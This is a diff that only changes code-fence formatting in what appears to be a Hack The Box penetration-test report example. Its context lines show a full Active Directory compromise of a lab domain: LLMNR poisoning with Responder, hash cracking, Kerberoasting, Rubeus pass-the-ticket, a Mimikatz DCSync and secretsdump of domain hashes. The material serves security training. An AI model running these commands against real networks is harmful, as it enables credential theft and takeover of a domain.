@@ -45,8 +45,7 @@ Upon connecting to the network, the tester started the Responder tool and was ab
 
 #### Responder
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$  sudo responder -I eth0 -wrfv
 
                                          __
@@ -85,8 +84,7 @@ The tester was successful in "cracking" this password hash offline using the Has
 
 #### Hashcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -106,8 +104,7 @@ The tester proceeded to enumerate user accounts configured with Service Principa
 
 #### GetUserSPNs
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204
 
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
@@ -127,8 +124,7 @@ The tester then ran the Python version of the popular BloodHound Active Director
 
 #### Bloodhound
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All
 
 INFO: Found AD domain: inlanefreight.local
@@ -150,8 +146,7 @@ The tester then performed a targeted Kerberoasting attack to retrieve the Kerber
 
 #### GetUserSPNs
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc
 
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
@@ -168,8 +163,7 @@ The tester was successful in "cracking" this password offline to reveal its clea
 
 #### Hashcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -183,8 +177,7 @@ This password could be used to access the `SQL01` host remotely and retrieve a s
 
 #### CrackMapExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa
 
 SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
@@ -206,8 +199,7 @@ Using these credentials, the tester logged into the `MS01` host via Remote Deskt
 
 #### Logged In Users
 
-```
-        cmd
+```bat
 C:\htb> query user
 
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
@@ -223,8 +215,7 @@ After connecting, the tester used the Rubeus tool to view all Kerberos tickets c
 
 #### Rubeus
 
-```
-        powershell
+```powershell
 PS C:\htb> .\Rubeus.exe triage
 
    ______        _
@@ -256,8 +247,7 @@ Action: Triage Kerberos Tickets (All Users)
 
 The tester then used this tool to retrieve the Kerberos TGT ticket for this user, which can then be used to perform a "pass-the-ticket" attack and use the stolen TGT ticket to access resources in the domain.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
 
    ______        _
@@ -315,8 +305,7 @@ Action: Dump Kerberos Ticket Data (All Users)
 
 The user performed the pass-the-ticket attack and successfully authenticated as the `pramirez` user.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
 ```
 
@@ -324,8 +313,7 @@ This was confirmed using the `klist` command to view cached Kerberos tickets in 
 
 #### Cached Kerberos Tickets
 
-```
-        powershell
+```powershell
 PS C:\htb> klist
 
 Current LogonId is 0:0x256d1d
@@ -348,8 +336,7 @@ The tester then utilized this access to perform a DCSync attack and retrieve the
 
 #### Mimikatz
 
-```
-        powershell
+```powershell
 PS C:\htb> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -387,8 +374,7 @@ The tester confirmed this access by authenticating to a Domain Controller in the
 
 #### CrackMapExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2
 
 SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -399,8 +385,7 @@ With this access, it was possible to retrieve the NTLM password hashes for all u
 
 #### Dumping NTDS with SecretsDump
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm
 
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
